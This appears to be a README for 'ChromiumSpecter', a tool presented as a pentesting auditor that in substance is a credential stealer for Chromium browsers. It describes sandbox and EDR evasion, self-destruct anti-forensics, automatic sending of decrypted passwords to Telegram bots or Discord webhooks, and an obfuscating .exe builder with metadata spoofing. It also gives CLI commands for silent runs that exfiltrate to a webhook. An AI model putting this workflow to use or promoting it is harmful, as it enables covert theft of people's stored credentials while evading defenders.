## 📖 Overview

**ChromiumSpecter** is a high-performance auditing tool designed for security professionals and pentesting teams. It allows for the recovery, decryption, and exfiltration of credentials stored in Chromium-based browsers (Chrome, Edge, Brave, Opera, Vivaldi) using advanced stealth and anti-forensics techniques.

### 🌟 Key Features

* **🖥️ High-Density Dashboard**: Professional GUI with real-time consoles, dynamic statistics, and optimized result management.
* **🕵️ Tactical Stealth Engine**:
  * **Startup Delay**: Initial delay selector (0-300s) to evade analysis in smart Sandboxes.
  * **Inter-file Delay (`send_delay`)**: Customizable pauses between uploads to prevent traffic spikes that alert firewalls or EDRs.
  * **Anti-Forensics**: **Tactical Self-Destruct** (Auto-Delete) support for the binary after execution.
  * **Panic Protocol**: Total sanitization of the audit environment with a single click.

### 🚀 Smart Exfiltration

**Auto-Exfiltrate**: Immediate automatic upload configuration after audit.
**Multi-Channel**: Native support for **Telegram Bots** and **Discord Webhooks** with redundancy.
**Local Persistence**: Secure saving of exfiltration settings for recurring use.

### 🛠️ Integrated Visual Builder

* Generation of custom stubs with **Dynamic Injection** of parameters.
* **Metadata Spoofing**: Integrated presets to clone signatures.
* **Compression and Obfuscation**: Native support for UPX and PyArmor.

## 🚀 Tactical Workflow

1. **Configuration**: Define your Telegram/Discord tokens in the **Exfiltration** Tab and save them.
2. **Audit**: Launch the scan from the Dashboard. You can enable **Auto-exfiltrate** and **Self-Destruct** for a "fire and forget" cycle.
3. **Inspection**: View decrypted credentials in real-time in the **Results** Tab.
4. **Deployment**: Use the **Builder** to generate an `.exe` with your embedded credentials (Base64) and configured stealth presets.

## 🖥️ Advanced Usage (CLI)

The core engine (`main.py`) can run independently without the GUI, ideal for automation or quick terminal deployments.

```bash
# Basic audit
python main.py

# Audit with automatic exfiltration to Discord and self-destruct
python main.py --webhook "https://discord.com/api/webhooks/..." --self-destruct

# Silent audit (no console) saving to custom folder
python main.py --stealth --output-dir "C:\temp\logs"
```
